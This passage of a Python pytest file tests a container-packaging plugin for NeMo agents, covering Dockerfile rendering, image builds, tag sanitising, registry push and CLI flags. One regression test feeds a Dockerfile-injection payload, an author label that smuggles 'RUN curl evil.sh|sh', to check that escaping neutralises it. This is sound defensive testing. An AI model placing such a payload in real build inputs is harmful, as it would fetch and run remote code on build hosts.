        mock_build.return_value = "x:latest"

        with pytest.raises((SystemExit, ClickExit)):
            build_agent_image(bad, nat_version="1.0.0")

    @patch("nemo_agents_plugin.container.builder.docker_build")
    def test_build_skip_validation(self, mock_build: MagicMock, tmp_path: Path) -> None:
        from nemo_agents_plugin.container.builder import build_agent_image

        bad = tmp_path / "bad.yaml"
        bad.write_text("no_workflow_here: true\n")
        mock_build.return_value = "x:latest"

        result = build_agent_image(bad, nat_version="1.0.0", skip_validation=True)
        assert result == "x:latest"

    @patch("nemo_agents_plugin.container.builder.docker_build")
    def test_build_passes_allow_root(self, mock_build: MagicMock, agent_config: Path) -> None:
        from nemo_agents_plugin.container.builder import build_agent_image

        mock_build.return_value = "x:latest"
        build_agent_image(agent_config, nat_version="1.0.0", allow_root=True)

        call_kwargs = mock_build.call_args.kwargs
        dockerfile = call_kwargs["dockerfile"]
        assert not dockerfile.exists()  # cleaned up

    @patch("nemo_agents_plugin.container.builder.docker_build")
    def test_build_with_external_template(self, mock_build: MagicMock, agent_config: Path, tmp_path: Path) -> None:
        from nemo_agents_plugin.container.builder import build_agent_image

        tpl = tmp_path / "custom.j2"
        tpl.write_text("FROM scratch\nRUN echo {{ nat_version }}")
        mock_build.return_value = "x:latest"

        build_agent_image(agent_config, nat_version="5.0.0", template_path=str(tpl))

        call_kwargs = mock_build.call_args.kwargs
        assert "5.0.0" in call_kwargs["build_args"]["NAT_VERSION"]

    @patch("nemo_agents_plugin.container.builder.docker_build")
    def test_build_cleanup_on_failure(self, mock_build: MagicMock, agent_config: Path) -> None:
        from nemo_agents_plugin.container.builder import build_agent_image

        mock_build.side_effect = SystemExit(1)

        with pytest.raises((SystemExit, ClickExit)):
            build_agent_image(agent_config, nat_version="1.0.0")

        assert not (agent_config.parent / "Dockerfile.generated").exists()
        assert not (agent_config.parent / ".dockerignore").exists()


# ---------------------------------------------------------------------------
# Default tag tests
# ---------------------------------------------------------------------------


class TestDefaultTag:
    """Tests for the ``{agent_name}-{agent_id}:{agent_version}`` convention."""

    def test_config_only_fallback(self, agent_config: Path) -> None:
        import re

        from nemo_agents_plugin.container.builder import _default_tag

        tag = _default_tag(agent_config, agent_author="x")
        name_id, version = tag.rsplit(":", 1)
        assert name_id.startswith("config-")
        assert re.match(r"\d{2}\.\d{2}\.\d{2}$", version), f"Expected YY.MM.DD, got {version}"
        assert len(name_id.split("-", 1)[1]) == 12

    def test_with_pyproject(self, project_dir: tuple[Path, Path]) -> None:
        from nemo_agents_plugin.container.builder import _default_tag

        config, pyproject = project_dir
        tag = _default_tag(config, pyproject, agent_author="x")
        name_id, version = tag.rsplit(":", 1)
        assert name_id.startswith("test-agent-")
        assert version == "2.3.0"

    def test_explicit_version_override(self, agent_config: Path) -> None:
        from nemo_agents_plugin.container.builder import _default_tag

        tag = _default_tag(agent_config, agent_version="5.0.0", agent_author="x")
        assert tag.endswith(":5.0.0")

    def test_deterministic(self, agent_config: Path) -> None:
        from nemo_agents_plugin.container.builder import _default_tag

        t1 = _default_tag(agent_config, agent_author="x")
        t2 = _default_tag(agent_config, agent_author="x")
        name1, _ = t1.rsplit(":", 1)
        name2, _ = t2.rsplit(":", 1)
        assert name1 == name2


# ---------------------------------------------------------------------------
# Publish tests
# ---------------------------------------------------------------------------


class TestDockerPush:
    def _call_push(self, mock_docker: MagicMock, **kwargs: str | None) -> str:
        import sys
        from importlib import reload

        from nemo_agents_plugin.container import publisher

        fake_module = MagicMock(docker=mock_docker)
        with patch.dict(sys.modules, {"python_on_whales": fake_module}):
            reload(publisher)
            return publisher.docker_push(**kwargs)

    def test_push_computes_remote_tag(self) -> None:
        mock_docker = MagicMock()
        self._call_push(
            mock_docker,
            local_tag="agent:2.0",
            registry="registry.example.com/team",
        )
        expected_remote = "registry.example.com/team/agent:2.0"
        mock_docker.tag.assert_called_once_with("agent:2.0", expected_remote)
        mock_docker.push.assert_called_once_with(expected_remote)

    def test_push_with_explicit_push_tag(self) -> None:
        mock_docker = MagicMock()
        self._call_push(
            mock_docker,
            local_tag="my-agent:1.0",
            registry="nvcr.io/org",
            push_tag="nvcr.io/org/custom:v1",
        )
        mock_docker.tag.assert_called_once_with("my-agent:1.0", "nvcr.io/org/custom:v1")
        mock_docker.push.assert_called_once_with("nvcr.io/org/custom:v1")

    def test_push_strips_trailing_slash(self) -> None:
        mock_docker = MagicMock()
        self._call_push(
            mock_docker,
            local_tag="img:v1",
            registry="nvcr.io/org/",
        )
        mock_docker.tag.assert_called_once_with("img:v1", "nvcr.io/org/img:v1")


# ---------------------------------------------------------------------------
# resolve_value tests
# ---------------------------------------------------------------------------


class TestResolveValue:
    def test_explicit_wins(self) -> None:
        from nemo_agents_plugin.container.template import resolve_value

        assert resolve_value("base_image_url", "explicit") == "explicit"

    def test_env_var_fallback(self, monkeypatch: pytest.MonkeyPatch) -> None:
        from nemo_agents_plugin.container.template import resolve_value

        monkeypatch.setenv("NAT_VERSION", "envval")
        assert resolve_value("nat_version") == "envval"

    def test_default_fallback(self) -> None:
        from nemo_agents_plugin.container.template import resolve_value

        assert resolve_value("python_version") == "3.13"

    def test_required_raises(self) -> None:
        from nemo_agents_plugin.container.template import resolve_value

        # Names not in _DEFAULTS and not in _ENV_MAP must raise — every real
        # parameter now has a default, so use an unknown key to cover the
        # 'unresolvable required' branch.
        with pytest.raises(ValueError, match="nonexistent_param"):
            resolve_value("nonexistent_param")


# ---------------------------------------------------------------------------
# End-to-end integration test
# ---------------------------------------------------------------------------


class TestEndToEndPipeline:
    """Integration test exercising render → build → publish in sequence."""

    @patch("nemo_agents_plugin.container.builder.docker_build")
    def test_render_then_build_then_publish(self, mock_build: MagicMock, agent_config: Path, tmp_path: Path) -> None:
        from nemo_agents_plugin.container.builder import build_agent_image
        from nemo_agents_plugin.container.template import render_dockerfile, render_dockerignore

        rendered = render_dockerfile(
            agent_config,
            None,
            nat_version="1.4.0",
            agent_version="1.0.0",
            agent_author="e2e-test",
        )
        assert "USER agent" in rendered
        assert 'org.opencontainers.image.version="1.0.0"' in rendered
        assert 'org.opencontainers.image.authors="e2e-test"' in rendered
        assert "--no-install-recommends" in rendered

        dockerfile_path = tmp_path / "Dockerfile"
        dockerfile_path.write_text(rendered)

        ignore_path = render_dockerignore(tmp_path)
        assert ignore_path is not None  # narrow Path | None
        assert ignore_path.exists()

        mock_build.return_value = "e2e-agent:1.0.0"
        tag = build_agent_image(
            agent_config,
            dockerfile=dockerfile_path,
            tag="e2e-agent:1.0.0",
            nat_version="1.4.0",
        )
        assert tag == "e2e-agent:1.0.0"

        mock_docker = MagicMock()
        import sys
        from importlib import reload
        from unittest.mock import patch as _patch

        from nemo_agents_plugin.container import publisher

        fake_module = MagicMock(docker=mock_docker)
        with _patch.dict(sys.modules, {"python_on_whales": fake_module}):
            reload(publisher)
            remote = publisher.docker_push(
                local_tag="e2e-agent:1.0.0",
                registry="nvcr.io/test-org",
            )

        assert remote == "nvcr.io/test-org/e2e-agent:1.0.0"
        mock_docker.tag.assert_called_once()
        mock_docker.push.assert_called_once()

    @patch("nemo_agents_plugin.container.builder.docker_build")
    def test_full_pipeline_with_project_mode(self, mock_build: MagicMock, project_dir: tuple[Path, Path]) -> None:
        from nemo_agents_plugin.container.builder import build_agent_image
        from nemo_agents_plugin.container.validator import validate_agent_config

        config, pyproject = project_dir

        validation = validate_agent_config(config)
        assert validation.valid

        mock_build.return_value = "placeholder"
        build_agent_image(
            config,
            pyproject=pyproject,
            nat_version="1.4.0",
            agent_version="2.3.0",
            agent_author="proj-test",
        )

        actual_tag = mock_build.call_args.kwargs["tag"]
        assert actual_tag.startswith("test-agent-")
        assert actual_tag.endswith(":2.3.0")

        built_dockerfile = mock_build.call_args.kwargs["dockerfile"]
        assert not built_dockerfile.exists()

    @patch("nemo_agents_plugin.container.builder.docker_build")
    def test_validation_blocks_bad_config(self, mock_build: MagicMock, tmp_path: Path) -> None:
        from nemo_agents_plugin.container.builder import build_agent_image

        bad = tmp_path / "bad_agent.yaml"
        bad.write_text("llms:\n  x: {}\n")

        with pytest.raises((SystemExit, ClickExit)):
            build_agent_image(bad, nat_version="1.0.0")

        mock_build.assert_not_called()

    @patch("nemo_agents_plugin.container.builder.docker_build")
    def test_external_template_e2e(self, mock_build: MagicMock, agent_config: Path, tmp_path: Path) -> None:
        from nemo_agents_plugin.container.template import render_dockerfile

        custom_tpl = tmp_path / "tpl.j2"
        custom_tpl.write_text(
            "FROM alpine\nLABEL agent={{ agent_name }} version={{ agent_version }}\nRUN echo {{ nat_version }}\n"
        )

        rendered = render_dockerfile(
            agent_config,
            None,
            nat_version="7.0.0",
            agent_version="1.2.3",
            template_path=str(custom_tpl),
        )

        assert "FROM alpine" in rendered
        assert "agent=config" in rendered
        assert "version=1.2.3" in rendered
        assert "echo 7.0.0" in rendered

    @patch("nemo_agents_plugin.container.builder.docker_build")
    def test_allow_root_e2e(self, mock_build: MagicMock, agent_config: Path) -> None:
        from nemo_agents_plugin.container.builder import build_agent_image

        mock_build.return_value = "root-agent:latest"
        build_agent_image(agent_config, nat_version="1.0.0", allow_root=True)

        generated = agent_config.parent / "Dockerfile.generated"
        content = generated.read_text() if generated.exists() else ""
        assert "USER agent" not in content


# ---------------------------------------------------------------------------
# `nemo agents package` CLI command
# ---------------------------------------------------------------------------


@pytest.fixture()
def package_cli():
    """Return a Typer app with only the ``package`` command registered.

    A no-op callback keeps the app in multi-command mode so ``package``
    must be invoked explicitly (matching real ``nemo agents package`` usage).
    """
    import typer
    from nemo_agents_plugin.cli import _register_package_command
    from typer.testing import CliRunner

    app = typer.Typer(no_args_is_help=True)

    @app.callback()
    def _root() -> None:
        pass

    _register_package_command(app)
    return app, CliRunner()


class TestPackageCommand:
    """Tests for the unified ``nemo agents package`` CLI command."""

    def test_no_build_renders_dockerfile_and_ignore(self, package_cli, agent_config: Path, tmp_path: Path) -> None:
        """``--no-build`` emits Dockerfile + .dockerignore and never calls the builder."""
        app, runner = package_cli
        output = tmp_path / "Dockerfile"

        with (
            patch("nemo_agents_plugin.container.builder.build_agent_image") as mock_build,
            patch("nemo_agents_plugin.container.publisher.docker_push") as mock_push,
        ):
            result = runner.invoke(
                app,
                [
                    "package",
                    "--agent",
                    str(agent_config),
                    "--nat-version",
                    "1.5.0",
                    "--output",
                    str(output),
                    "--no-build",
                ],
            )

        assert result.exit_code == 0, result.stdout
        assert output.exists()
        assert (output.parent / ".dockerignore").exists()
        assert "Dockerfile written to" in result.stdout
        mock_build.assert_not_called()
        mock_push.assert_not_called()

    def test_no_build_project_mode_writes_dockerfile_next_to_pyproject(
        self, package_cli, project_dir: "tuple[Path, Path]"
    ) -> None:
        """In --pyproject mode the default output lives at the project root.

        Regression: the Dockerfile's ``COPY pyproject.toml .`` / ``COPY . .``
        only resolve when the Dockerfile sits beside pyproject.toml.  With a
        nested agent config (``configs/config.yaml``) the old default put the
        Dockerfile in ``configs/``, breaking the build context.
        """
        app, runner = package_cli
        config, pyproject = project_dir

        result = runner.invoke(
            app,
            [
                "package",
                "--agent",
                str(config),
                "--pyproject",
                str(pyproject),
                "--nat-version",
                "1.4.0",
                "--no-build",
            ],
        )

        assert result.exit_code == 0, result.stdout
        # Default output must be the project root (pyproject's directory),
        # NOT the config's parent directory.
        assert (pyproject.parent / "Dockerfile").exists()
        assert not (config.parent / "Dockerfile").exists()
        assert (pyproject.parent / ".dockerignore").exists()

    def test_no_build_config_only_mode_writes_dockerfile_next_to_config(self, package_cli, agent_config: Path) -> None:
        """Without --pyproject the default output stays beside the agent config."""
        app, runner = package_cli

        result = runner.invoke(
            app,
            [
                "package",
                "--agent",
                str(agent_config),
                "--nat-version",
                "1.4.0",
                "--no-build",
            ],
        )

        assert result.exit_code == 0, result.stdout
        assert (agent_config.parent / "Dockerfile").exists()

    def test_warns_when_nat_version_unpinned_and_silent_when_pinned(
        self, package_cli, agent_config: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """Package CLI warns on unpinned --nat-version, stays silent when pinned.

        Reproducibility hinges on callers pinning the NAT release explicitly.
        One test exercises both branches (unpinned → warn, pinned → silent)
        and verifies the warned version matches the baked-in default so
        reviewers updating the default can't accidentally drift the message.
        """
        from nemo_agents_plugin.container.template import _DEFAULTS

        app, runner = package_cli
        monkeypatch.delenv("NAT_VERSION", raising=False)

        # Branch 1: no --nat-version flag, no env var → warning with the default version.
        unpinned = runner.invoke(
            app,
            ["package", "--agent", str(agent_config), "--no-build"],
        )
        assert unpinned.exit_code == 0, unpinned.stdout
        warn_stream = unpinned.stderr or unpinned.stdout
        assert "warning:" in warn_stream
        assert "--nat-version not provided" in warn_stream
        assert _DEFAULTS["nat_version"] in warn_stream

        # Branch 2: explicit --nat-version → no warning on the version at all.
        pinned = runner.invoke(
            app,
            ["package", "--agent", str(agent_config), "--nat-version", "1.4.0", "--no-build"],
        )
        assert pinned.exit_code == 0, pinned.stdout
        combined = (pinned.stderr or "") + pinned.stdout
        assert "--nat-version not provided" not in combined

    def test_default_runs_build_without_publish(self, package_cli, agent_config: Path) -> None:
        """Default invocation builds the image and does not publish."""
        app, runner = package_cli

        with (
            patch("nemo_agents_plugin.container.builder.build_agent_image") as mock_build,
            patch("nemo_agents_plugin.container.publisher.docker_push") as mock_push,
        ):
            mock_build.return_value = "my-agent:1.0"
            result = runner.invoke(
                app,
                [
                    "package",
                    "--agent",
                    str(agent_config),
                    "--nat-version",
                    "1.5.0",
                    "--tag",
                    "my-agent:1.0",
                ],
            )

        assert result.exit_code == 0, result.stdout
        assert "Image ready: my-agent:1.0" in result.stdout
        mock_build.assert_called_once()
        assert mock_build.call_args.kwargs["tag"] == "my-agent:1.0"
        mock_push.assert_not_called()

    def test_publish_pushes_after_build(self, package_cli, agent_config: Path) -> None:
        """``--publish --registry`` triggers a push after a successful build."""
        app, runner = package_cli

        with (
            patch("nemo_agents_plugin.container.builder.build_agent_image") as mock_build,
            patch("nemo_agents_plugin.container.publisher.docker_push") as mock_push,
        ):
            mock_build.return_value = "my-agent:1.0"
            mock_push.return_value = "nvcr.io/my-org/my-agent:1.0"

            result = runner.invoke(
                app,
                [
                    "package",
                    "--agent",
                    str(agent_config),
                    "--nat-version",
                    "1.5.0",
                    "--tag",
                    "my-agent:1.0",
                    "--publish",
                    "--registry",
                    "nvcr.io/my-org",
                ],
            )

        assert result.exit_code == 0, result.stdout
        assert "Image ready: my-agent:1.0" in result.stdout
        assert "Published: nvcr.io/my-org/my-agent:1.0" in result.stdout
        mock_build.assert_called_once()
        mock_push.assert_called_once_with(local_tag="my-agent:1.0", registry="nvcr.io/my-org", push_tag=None)

    def test_publish_without_registry_fails(self, package_cli, agent_config: Path) -> None:
        """``--publish`` without ``--registry`` is rejected before any build runs."""
        app, runner = package_cli

        with (
            patch("nemo_agents_plugin.container.builder.build_agent_image") as mock_build,
            patch("nemo_agents_plugin.container.publisher.docker_push") as mock_push,
        ):
            result = runner.invoke(
                app,
                ["package", "--agent", str(agent_config), "--publish"],
            )

        assert result.exit_code != 0
        assert "--registry" in (result.stderr or result.stdout)
        mock_build.assert_not_called()
        mock_push.assert_not_called()

    def test_no_build_and_publish_are_mutually_exclusive(self, package_cli, agent_config: Path) -> None:
        """``--no-build --publish`` is rejected at flag-validation time."""
        app, runner = package_cli

        with (
            patch("nemo_agents_plugin.container.builder.build_agent_image") as mock_build,
            patch("nemo_agents_plugin.container.publisher.docker_push") as mock_push,
        ):
            result = runner.invoke(
                app,
                [
                    "package",
                    "--agent",
                    str(agent_config),
                    "--no-build",
                    "--publish",
                    "--registry",
                    "nvcr.io/x",
                ],
            )

        assert result.exit_code != 0
        assert "mutually exclusive" in (result.stderr or result.stdout)
        mock_build.assert_not_called()
        mock_push.assert_not_called()

    def test_invalid_format_fails(self, package_cli, agent_config: Path) -> None:
        """Unknown ``--format`` values are rejected."""
        app, runner = package_cli
        result = runner.invoke(
            app,
            ["package", "--agent", str(agent_config), "--format", "bogus", "--no-build"],
        )
        assert result.exit_code != 0
        assert "--format" in (result.stderr or result.stdout)

    def test_whl_format_rejected_in_every_mode(self, package_cli, agent_config: Path) -> None:
        """``--format whl`` is rejected before any build/render runs.

        Wheel packaging was scaffolded into the original CLI surface but
        never wired into either the build path or the render-only path.
        The guard lives in ``_validate_package_flags`` so we get the same
        "not yet implemented" error in both ``--no-build`` and the default
        build mode, instead of silently falling through to a docker build
        that ignores ``--format``.

        ``--agent-whl`` was removed alongside the validator branch that
        checked it; this test no longer needs to pass it.
        """
        app, runner = package_cli

        with patch("nemo_agents_plugin.container.builder.build_agent_image") as mock_build:
            no_build_result = runner.invoke(
                app,
                ["package", "--agent", str(agent_config), "--format", "whl", "--no-build"],
            )
            build_result = runner.invoke(
                app,
                [
                    "package",
                    "--agent",
                    str(agent_config),
                    "--format",
                    "whl",
                    "--nat-version",
                    "1.5.0",
                ],
            )

        for result in (no_build_result, build_result):
            assert result.exit_code != 0
            assert "not yet implemented" in (result.stderr or result.stdout)
        mock_build.assert_not_called()


# ---------------------------------------------------------------------------
# Bug-fix regressions (see commit notes for the originating critical review)
# ---------------------------------------------------------------------------


class TestPackagingSafetyRegressions:
    """Lock in the safety fixes shipped after the initial critical review.

    Each test bundles several related assertions to minimize fixture
    overhead and to keep the regression contract for one bug visible in
    one place.
    """

    def test_label_values_are_escaped_against_dockerfile_injection(self, agent_config: Path) -> None:
        """Quotes, backslashes, and newlines in label values must not break out.

        Covers:
          * ``"`` in ``--agent-author`` (terminates the LABEL string early).
          * ``\\n`` in ``--agent-author`` (could inject a free-standing
            ``RUN`` instruction).
          * ``\\`` in ``--agent-author`` (escape character collision).
        """
        from nemo_agents_plugin.container.template import _dockerfile_escape, render_dockerfile

        assert _dockerfile_escape('Alice "the Hacker"') == 'Alice \\"the Hacker\\"'
        assert _dockerfile_escape("multi\nline") == "multi line"
        assert _dockerfile_escape("back\\slash") == "back\\\\slash"

        rendered = render_dockerfile(
            agent_config,
            nat_version="1.4.0",
            agent_version="1.0.0",
            agent_author='Eve";\nRUN curl evil.sh|sh\nLABEL hijacked="yes',
        )
        # The injection attempt is reduced to a single LABEL line with the
        # quote/backslash escaped and the newline collapsed to a space.
        assert "\nRUN curl evil.sh" not in rendered
        assert 'LABEL hijacked="yes"' not in rendered
        assert 'org.opencontainers.image.authors="Eve\\";' in rendered

    def test_dockerignore_preserves_user_files_and_overwrites_its_own(self, tmp_path: Path) -> None:
        """User-owned ``.dockerignore`` is preserved; plugin-owned is regenerated.

        The two cases must coexist: the first invocation in a project writes
        the plugin's file (with sentinel header), and re-running the
        packager must update that file in place without trampling a
        user-tuned one that exists alongside.
        """
        from nemo_agents_plugin.container.template import DOCKERIGNORE_SENTINEL, render_dockerignore

        # Case 1: no file → write ours.
        first = render_dockerignore(tmp_path)
        assert first is not None and first.exists()
        assert first.read_text().splitlines()[0] == DOCKERIGNORE_SENTINEL

        # Case 2: our previous file (sentinel present) → overwrite in place.
        first.write_text(DOCKERIGNORE_SENTINEL + "\nstale-contents\n")
        regenerated = render_dockerignore(tmp_path)
        assert regenerated == first
        assert "stale-contents" not in first.read_text()

        # Case 3: user-owned file (no sentinel) → leave it alone, return None.
        user_dir = tmp_path / "user_project"
        user_dir.mkdir()
        user_content = "# my carefully tuned ignores\ndata/\nlarge_assets/**\n"
        (user_dir / ".dockerignore").write_text(user_content)
        result = render_dockerignore(user_dir)
        assert result is None
        assert (user_dir / ".dockerignore").read_text() == user_content

    def test_no_build_refuses_to_clobber_existing_default_dockerfile(self, package_cli, agent_config: Path) -> None:
        """``--no-build`` must not silently overwrite the user's existing Dockerfile.

        Explicit ``--output`` is treated as informed consent and still
        overwrites; only the default-resolved path triggers the guard.
        """
        app, runner = package_cli

        existing = agent_config.parent / "Dockerfile"
        existing.write_text("FROM scratch\n# user's hand-tuned Dockerfile\n")

        # Default output → refuse, preserve.
        default_result = runner.invoke(
            app,
            ["package", "--agent", str(agent_config), "--nat-version", "1.4.0", "--no-build"],
        )
        assert default_result.exit_code != 0
        assert "refusing to overwrite" in (default_result.stderr or default_result.stdout)
        assert "user's hand-tuned" in existing.read_text()

        # Explicit --output to the same path → allowed.
        explicit_result = runner.invoke(
            app,
            [
                "package",
                "--agent",
                str(agent_config),
                "--nat-version",
                "1.4.0",
                "--no-build",
                "--output",
                str(existing),
            ],
        )
        assert explicit_result.exit_code == 0, explicit_result.stdout
        assert "user's hand-tuned" not in existing.read_text()
        assert "FROM " in existing.read_text()

    def test_no_build_oserror_yields_clean_cli_error(self, package_cli, agent_config: Path, tmp_path: Path) -> None:
        """``OSError`` from the filesystem write surfaces as a clean CLI error.

        Regression: ``output.write_text`` and ``render_dockerignore`` ran
        outside any ``try`` block, so a read-only mount or a missing
        parent directory leaked a raw ``FileNotFoundError`` /
        ``PermissionError`` traceback to the operator.  Both writes are
        now wrapped in ``except OSError`` and exit via ``typer.Exit(1)``
        with an ``Error:`` line that names the failing file and the
        underlying message.
        """
        app, runner = package_cli

        # Parent directory deliberately doesn't exist → ``Path.write_text``
        # raises ``FileNotFoundError`` (an ``OSError`` subclass).
        bad_output = tmp_path / "nonexistent_subdir" / "Dockerfile"
        result = runner.invoke(
            app,
            [
                "package",
                "--agent",
                str(agent_config),
                "--nat-version",
                "1.4.0",
                "--no-build",
                "--output",
                str(bad_output),
            ],
        )
        assert result.exit_code != 0
        combined = (result.stderr or "") + (result.stdout or "")
        assert "Error: failed to write Dockerfile" in combined
        assert str(bad_output) in combined
        # The success message must not be printed when the write failed.
        assert "Dockerfile written to" not in combined
        # And no Python traceback should reach the operator.
        assert "Traceback" not in combined

    def test_multi_platform_rejected_with_actionable_error(self, package_cli, agent_config: Path) -> None:
        """Multiple ``--platform`` values are rejected — buildx wiring is not done.

        The previous CLI accepted multi-arch and printed a fake "pushed via
        buildx" success while actually building (and pushing) a single
        architecture.  We now fail fast with a pointer at the manual
        ``buildx imagetools`` workaround.
        """
        app, runner = package_cli

        with patch("nemo_agents_plugin.container.builder.build_agent_image") as mock_build:
            result = runner.invoke(
                app,
                [
                    "package",
                    "--agent",
                    str(agent_config),
                    "--nat-version",
                    "1.4.0",
                    "--platform",
                    "linux/amd64",
                    "--platform",
                    "linux/arm64",
                    "--publish",
                    "--registry",
                    "nvcr.io/x",
                ],
            )

        assert result.exit_code != 0
        message = result.stderr or result.stdout
        assert "multi-arch" in message
        assert "buildx imagetools" in message
        mock_build.assert_not_called()

    def test_default_tag_sanitizes_uppercase_names_and_pep440_versions(self, tmp_path: Path) -> None:
        """Default tag is always a valid Docker reference.

        PEP 621 ``project.name`` permits uppercase, and PEP 440
        ``project.version`` permits ``+local`` and ``!epoch`` segments;
        Docker rejects all of these.  Sanitize so the build never trips
        ``invalid reference format``.
        """
        from nemo_agents_plugin.container.builder import _default_tag, _sanitize_image_name, _sanitize_image_tag

        assert _sanitize_image_name("HelloWorld") == "helloworld"
        assert _sanitize_image_name("My Project!") == "my-project"
        assert _sanitize_image_name("") == "agent"
        assert _sanitize_image_tag("1.0.0+local.20260529") == "1.0.0.local.20260529"
        assert _sanitize_image_tag("1!2.0") == "1.2.0"
        assert _sanitize_image_tag("") == "latest"

        (tmp_path / "configs").mkdir()
        config = tmp_path / "configs" / "config.yaml"
        config.write_text(VALID_CONFIG)
        pyproject = tmp_path / "pyproject.toml"
        pyproject.write_text('[project]\nname = "HelloWorld"\nversion = "1.0.0+local"\n')

        tag = _default_tag(config, pyproject, agent_author="x")
        name_part, version_part = tag.rsplit(":", 1)
        # Repo component must be lowercase; tag must not contain '+'.
        assert name_part == name_part.lower()
        assert "+" not in version_part

    def test_outside_pyproject_tree_fails_fast_instead_of_silently_breaking(
        self, agent_config: Path, tmp_path: Path
    ) -> None:
        """Agent config outside the pyproject build context must error at render time.

        Previously the renderer fell back to ``Path(agent_config.name)``,
        which produced an image that built successfully but crashed at
        ``nat serve`` startup with ``config file not found``.
        """
        from nemo_agents_plugin.container.template import render_dockerfile

        elsewhere = tmp_path / "elsewhere"
        elsewhere.mkdir()
        pyproject = elsewhere / "pyproject.toml"
        pyproject.write_text('[project]\nname = "x"\nversion = "1.0.0"\n')

        with pytest.raises(ValueError, match="outside the pyproject build context"):
            render_dockerfile(agent_config, pyproject, nat_version="1.4.0", agent_author="x")

    def test_agent_id_includes_build_environment(self, agent_config: Path) -> None:
        """Changing the toolchain must change the agent_id.

        Otherwise two ABI-incompatible images (built against different
        ``--nat-version`` / base images) share the same content-addressable
        suffix, making the id useless for caching or rollback.
        """
        from nemo_agents_plugin.container.metadata import extract_agent_metadata

        meta_v1 = extract_agent_metadata(
            agent_config,
            agent_author="x",
            build_env={"nat_version": "1.4.0", "python_version": "3.12"},
        )
        meta_v2 = extract_agent_metadata(
            agent_config,
            agent_author="x",
            build_env={"nat_version": "1.7.0", "python_version": "3.12"},
        )
        meta_legacy = extract_agent_metadata(agent_config, agent_author="x")

        assert meta_v1["agent_id"] != meta_v2["agent_id"]
        # Legacy callers that pass no build_env must still get a deterministic id.
        assert meta_legacy["agent_id"] == extract_agent_metadata(agent_config, agent_author="x")["agent_id"]

    def test_strip_credentials_drops_query_string_tokens(self) -> None:
        """Tokens hidden in the query string of an HTTPS git URL are scrubbed.

        Previously ``_strip_credentials`` only inspected ``userinfo`` in
        the netloc; a URL like ``https://github.com/x.git?token=TOKEN_X``
        leaked the token into ``org.opencontainers.image.source``.

        Fixtures use neutral placeholders (``TOKEN_X``) rather than real
        ``glpat-`` / ``ghp_`` prefixes so the test file does not trip
        secret-scanning hooks on push.
        """
        from nemo_agents_plugin.container.metadata import _strip_credentials

        assert _strip_credentials("https://github.com/x.git?token=TOKEN_X") == "https://github.com/x.git"
        assert _strip_credentials("https://gitlab.com/x.git?access_token=TOKEN_X#frag") == "https://gitlab.com/x.git"
        # SSH URLs keep their canonical shape unchanged.
        assert _strip_credentials("git@github.com:org/repo.git") == "git@github.com:org/repo.git"

    def test_source_date_epoch_pins_build_timestamp(self, agent_config: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        """``SOURCE_DATE_EPOCH`` makes ``image.created`` reproducible across runs."""
        from nemo_agents_plugin.container.metadata import extract_agent_metadata

        monkeypatch.setenv("SOURCE_DATE_EPOCH", "1700000000")
        meta = extract_agent_metadata(agent_config, agent_author="x")
        # 1700000000 = 2023-11-14T22:13:20 UTC.
        assert meta["build_timestamp"].startswith("2023-11-14T22:13:20")

    def test_builder_refuses_pre_existing_dockerfile_generated(self, tmp_path: Path, agent_config: Path) -> None:
        """``Dockerfile.generated`` collision triggers a refusal, not silent overwrite.

        The cleanup in ``finally`` would otherwise unlink the user's file
        once the build finishes.
        """
        from nemo_agents_plugin.container.builder import build_agent_image

        user_file = agent_config.parent / "Dockerfile.generated"
        user_file.write_text("USER OWNED — DO NOT DELETE\n")

        with pytest.raises((SystemExit, ClickExit)):
            build_agent_image(agent_config, nat_version="1.4.0", agent_author="x")

        assert user_file.exists()
        assert "USER OWNED" in user_file.read_text()
